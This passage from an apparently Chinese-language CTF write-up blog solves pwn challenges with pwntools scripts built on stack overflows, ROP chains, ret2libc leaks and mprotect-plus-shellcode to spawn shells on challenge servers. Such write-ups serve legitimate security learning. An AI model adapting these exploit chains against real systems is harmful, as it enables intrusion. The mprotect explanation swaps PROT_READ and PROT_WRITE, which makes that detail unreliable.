class="number">0x7</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露read的got地址</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(read_got)+p32(<span class="number">0x8</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]read_addr: &#x27;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;read&#x27;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span></span><br><span class="line">payload+=p32(system_addr)*<span class="number">2</span>+p32(bin_sh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h2><p>只要var[13]=11即可，var类型是DWORD型，所以每个占四个字节。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28623</span>)</span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*<span class="number">13</span>*<span class="number">4</span> + p64(<span class="number">0x11</span>)</span><br><span class="line">p.sendline(p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h2><p>直接有system函数，找到bin的地址加入即可</p><p>注意不能在vulnerable函数的返回地址后面直接跟参数，我们需要模拟call system函数的过程，在这个过程中call有一步是将下一条指令的地址压栈，所以我们需要构造一个假的返回地址，当然这个内容随意。写得脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29667</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">sys_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*<span class="number">0x8C</span> + p32(sys_addr)+<span class="string">&#x27;1234&#x27;</span>+p32(sh_addr)</span><br><span class="line">p.sendline(p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h2><p>get_flag函数，结果不能正确得到结果。原因是必须维护好栈，所以找一个函数来退出。于是利用了exit函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25371</span>)</span><br><span class="line">get_flag = <span class="number">0x080489A0</span></span><br><span class="line">a1 = <span class="number">0x308cd64f</span></span><br><span class="line">a2 = <span class="number">0x195719d1</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p32(get_flag)+p32(exit_addr)+p32(a1)+p32(a2)</span><br><span class="line">p.sendline(p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以利用mprotect函数修改内存为可写可读可执行，然后写入shellcode，直接执行，但是mprotect需要三个寄存器</p><p>int mprotect(void *addr, size_t len, int prot); addr 内存启始地址 len  修改内存的长度 prot 内存的权限 要想达到内存可执行的目的,我们看一下哪个内存最好修改,使用edb-debuger查看,或 $ ./ get_started_3dsctf_2016 &amp; $ cat /proc/[you_pid]/maps 查看内存区域 可以查看到,内存可读可写的地址为: 0x80EB000 ,所以我们对该内存进行增加一个权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">pop_ret = <span class="number">0x0804f460</span></span><br><span class="line">bss=<span class="number">0x080eb000</span></span><br><span class="line">r = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29416</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(elf.sym[<span class="string">&#x27;mprotect&#x27;</span>])+p32(pop_ret)+p32(bss)+p32(<span class="number">0x30</span>)+p32(<span class="number">7</span>)+p32(elf.sym[<span class="string">&#x27;read&#x27;</span>])+p32(bss)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">0x30</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0</span>, buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);</span><br><span class="line"><span class="comment">// 栈地址 0x10但为什么要加8 可能中间有出栈</span></span><br><span class="line"><span class="number">-0000000000000010</span> buf db <span class="number">12</span> dup(?)</span><br><span class="line"><span class="number">-0000000000000004</span> nbytes dq ?</span><br><span class="line">+<span class="number">0000000000000004</span> db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000005</span> db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000006</span> db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000007</span> db ? ; undefined</span><br><span class="line">+<span class="number">0000000000000008</span>  r db <span class="number">8</span> dup(?)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28532</span>)</span><br><span class="line">shell_addr=<span class="number">0x4006e6</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;100&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(shell_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>和ciscn_2019_c_1题一样</p><h2 id="JarvisOJ-Level2-x64"><a href="#JarvisOJ-Level2-x64" class="headerlink" title="JarvisOJ_Level2_x64"></a>JarvisOJ_Level2_x64</h2><p>32位的函数在调用栈的时候是：</p><pre><code>   调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1....-&gt;参数1</code></pre><p>64位的函数在调用栈的时候是：</p><pre><code>   前六个参数按照约定存储在寄存器：rdi,rsi,rdx,rcx,r8,r9中。   参数超过六个的时候，第七个会压入栈中，并且先输入函数的返回地址，然后是函数的参数，之后才是函数的调用地址</code></pre><p>地址会继续往下走，那么在pop掉前面的‘a’之后便是pop下一个ropgadget出来的地址，然后就是栈顶的/bin/sh的地址被pop掉并放在rdi中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29134</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line">sys_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi =  <span class="number">0x4006b3</span> <span class="comment"># 当从此地址解析 就成了 pop rdi;ret; </span></span><br><span class="line"><span class="comment"># 00000000004006B2 41 5F             pop     r15</span></span><br><span class="line">p1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.sendline(p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="未解决：not-the-same-3dsctf-2016"><a href="#未解决：not-the-same-3dsctf-2016" class="headerlink" title="未解决：not_the_same_3dsctf_2016"></a>未解决：not_the_same_3dsctf_2016</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28326</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./not&#x27;</span>)</span><br><span class="line">get_secret = <span class="number">0x80489A0</span></span><br><span class="line">flag_addr = <span class="number">0x80eca2d</span></span><br><span class="line">p1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">45</span> + p32(get_secret)+p32(e.symbols[<span class="string">&#x27;write&#x27;</span>])+p32(flag_addr)+p32(<span class="number">1</span>)+p32(flag_addr)+p32(<span class="number">42</span>)<span class="comment"># 42是flag长度</span></span><br><span class="line">p.sendline(p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>第二种相对难一点，在此之前呢我们先了解一个函数</p><p>mprotect（）这个函数：<code>int mprotect(const void *start, size_t len, int prot);</code></p><p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p><p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p><p>1）PROT_READ：表示内存段内的内容可写；</p><p>2）PROT_WRITE：表示内存段内的内容可读；</p><p>3）PROT_EXEC：表示内存段中的内容可执行；</p><p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p><p>需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p><p>如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。<br>下面是<strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./not&#x27;</span>)</span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28326</span>)</span><br><span class="line"></span><br><span class="line">pop3_ret = <span class="number">0x0804f420</span><span class="comment">#gadget:pop ebx; pop esi; pop ebp; ret;用来向mprotect()、read()传参</span></span><br><span class="line">     <span class="comment">#ROPgadget --binary get_started --only &#x27;pop|ret&#x27; | grep pop</span></span><br><span class="line"><span class="comment">#为了后续再能使用栈ret,我们得构造一下栈的布局,因为mprotect函数使用到了3个参数,我们就找存在3个连续pop的指令，为啥要找3个pop,也就是在正常情况下,函数传参是使用push，所以要为了堆栈还原,函数调用结束时就使用pop来保证堆栈完好.</span></span><br><span class="line"></span><br><span class="line">mem_addr = <span class="number">0x80eb000</span> <span class="comment">#可读可写的内存,但不可执行 got.plt</span></span><br><span class="line">mem_size = <span class="number">0x1000</span>    <span class="comment">#通过调试出来的值</span></span><br><span class="line">mem_proc = <span class="number">0x7</span>       <span class="comment">#可代表可读可写可执行</span></span><br><span class="line"></span><br><span class="line">mprotect_addr = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">read_addr = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">45</span> <span class="comment">#填充数据覆盖到ebp</span></span><br><span class="line">payload += p32(mprotect_addr) <span class="comment">#栈返回到mprotect()函数执行</span></span><br><span class="line">payload += p32(pop3_ret) <span class="comment">#执行完mprotect的返回地址,使esp往下+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#mprotect 的三个参数 mprotect(0x080ea000,0x1000,0x7)</span></span><br><span class="line">payload += p32(mem_addr)   <span class="comment">#mprotect函数参数1 修改的内存地址</span></span><br><span class="line">payload += p32(mem_size)   <span class="comment">#mprotect函数参数2 修改的内存大小</span></span><br><span class="line">payload += p32(mem_proc)   <span class="comment">#mprotect函数参数3 修改的权限</span></span><br><span class="line"></span><br><span class="line">payload += p32(read_addr) <span class="comment">#执行完pop3_ret后弹到read地址</span></span><br><span class="line">payload += p32(pop3_ret)  <span class="comment">#执行完read后将返回到pop3_ret指令,又继续使esp+12</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#read 的三个参数 read(0,0x080ea000,0x100)</span></span><br><span class="line">payload += p32(<span class="number">0</span>)     <span class="comment">#read函数参数1 ,从输入端读取，将我们生成的shellcode读入目标内存地址</span></span><br><span class="line">payload += p32(mem_addr)   <span class="comment">#读取到的内容复制到指向的内存里</span></span><br><span class="line">payload += p32(<span class="number">0x100</span>) <span class="comment">#读取大小</span></span><br><span class="line"></span><br><span class="line">payload += p32(mem_addr)   <span class="comment">#执行完read后ret esi，这里是返回到我们布置的shellcode执行</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">payload_shellcode = asm(shellcraft.sh(),arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>) </span><br><span class="line"></span><br><span class="line">sh.sendline(payload_shellcode)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-baby-rop"><a href="#HarekazeCTF2019-baby-rop" class="headerlink" title="[HarekazeCTF2019]baby_rop"></a>[HarekazeCTF2019]baby_rop</h2><p>pop rdi ret传入字符串并调用system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25591</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line">sys_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = e.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi =  <span class="number">0x400683</span></span><br><span class="line">p1 = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;? &#x27;</span>)</span><br><span class="line">p.sendline(p1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以通过 find -name flag 查找flag的位置</p><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><p>通过printf泄露read的函数地址计算libc的基址，ROP链构造system(‘/bin/sh’)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">28</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s your name? &quot;</span>);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26686</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret=<span class="number">0x400733</span></span><br><span class="line">rsi_r15_ret=<span class="number">0x400731</span></span><br><span class="line">format_str=<span class="number">0x400770</span>  <span class="comment">#%s</span></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr=<span class="number">0x400636</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(rdi_ret)+p64(format_str)</span><br><span class="line">payload+=p64(rsi_r15_ret)+p64(read_got)+p64(<span class="number">0x0</span>)</span><br><span class="line">payload+=p64(printf_plt)+p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr=u64(r.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=read_addr-libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>+p64(rdi_ret)+p64(binsh_addr)+p64(system_addr)+p64(main_addr)</span><br><span class="line">r.recvuntil(<span class="string">&quot;What&#x27;s your name?&quot;</span>)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="番外：攻防世界"><a href="#番外：攻防世界" class="headerlink" title="番外：攻防世界"></a>番外：攻防世界</h1><h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><code>知识点</code></p><ul><li>整数溢出</li></ul><p>看字符串，发现system和cat flag，存在高危函数strcpy和read</p><p>可以直接覆盖一个返回地址，覆盖成system函数的地址</p><p>看到check passwd函数，规定密码长度为3到8，s是密码的字符串，dest长度是0x14，s长度远大于dest，这就会导致栈溢出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)<span class="built_in">fflush</span>(stdout);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><ol><li>在覆盖到返回地址的途中，有一次leave操作，在32位汇编中，leave等价于mov esp,ebp并pop ebp的操作，也就是说，在覆盖到返回地址之前，还有一次出栈，所以需要多覆盖一个ebp的长度，由于是32位，所以是4字节，所以覆盖ebp0x4，十进制是4<br>总和就是’a’*24</li><li>p32(sys_addr)：覆盖返回地址为what_is_this函数的地址，即check_passwd之后直接返回what_is_this函数。</li><li>payload.ljust(260,’a’)：由于程序执行到what_is_this函数后我们可以直接得到flag，所以之后怎么运行就不用管了，直接填充一堆’a’来让payload的长度能通过密码长度检测即可。但是显然payload前两部分的长度就超过了密码检测的最大长度8，这个时候就用到了整数溢出</li></ol><p>v3即为密码的长度，可以看到它是一个长8位的只有正数的整数即00000000~11111111，就是0到255，当给v8赋值超过255时，比如256，即1 0000 0000，由于v8本身只有8位，所以超过8位的，就会发生高位截断，只会保留低位，所以这个1会被舍弃，v8的值就是0000 0000，而给v8赋值257，它的值就是1，赋值258，它的值就是2。所以只要让payload的长度在(259,264]内，就能让v8的值在(3,8]内，才能通过密码长度检测。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp1</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./intoverflow&#x27;</span>)</span><br><span class="line">sys_addr = elf.symbols[<span class="string">&#x27;what_is_this&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">24</span> + p32(sys_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">260</span>,<span class="string">&#x27;a&#x27;</span>) <span class="comment">#ljust可以用a来填充payload到指定长度260</span></span><br><span class="line"><span class="comment">#这一句也能写成这样：payload += &#x27;a&#x27;*(260-len(payload))</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">37911</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your username:&#x27;</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your passwd:&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">sh=remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="number">44241</span>)</span><br><span class="line"> </span><br><span class="line">sh.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;username:\n&quot;</span>,<span class="string">&quot;xctf&quot;</span>)</span><br><span class="line"> </span><br><span class="line">cat_flag_addr = <span class="number">0x08048694</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x18</span> + p32(cat_flag_addr) + <span class="string">&quot;A&quot;</span> * <span class="number">234</span><span class="comment"># 按264计算</span></span><br><span class="line"> 